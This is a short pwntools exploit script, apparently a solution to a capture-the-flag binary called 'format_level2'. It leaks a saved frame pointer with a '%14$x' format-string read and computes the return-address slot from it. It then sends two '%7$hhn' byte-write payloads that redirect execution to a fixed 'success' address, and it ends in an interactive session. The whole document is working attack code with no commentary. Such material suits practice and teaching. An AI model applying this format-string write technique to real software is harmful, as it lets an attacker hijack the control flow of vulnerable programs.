from pwn import *

p=remote("0",37699)
#p=process("./format_level2")
context(log_level = "debug",arch = "i386",os = "linux")
p.sendlineafter("Your choice:",b'3')
offset = 7
p.sendlineafter("Input what you want to talk:",b'%14$x')
p.recvuntil(":")
p.recvline()
old_ebp=b'0x'+p.recvline()[:-1]
old_ebp=int(old_ebp,16)
print(old_ebp)
ret=old_ebp+(0xffffd00c-0xffffd008)
success=0x08049330#0x93 0x3008049317
#p32(ret)+"%40c%7$hhn"   0x4a 0x30 40
#  8        40
payload1=p32(ret)+b"%19c%7$hhn"
p.sendlineafter("Your choice:",b'3')

p.sendlineafter("Input what you want to talk:",payload1)
payload2=p32(ret+1)+b"%143c%7$hhn"
p.sendlineafter("Your choice:",b'3')

p.sendlineafter("Input what you want to talk:",payload2)
p.sendlineafter("Your choice:",b'4')
p.interactive()
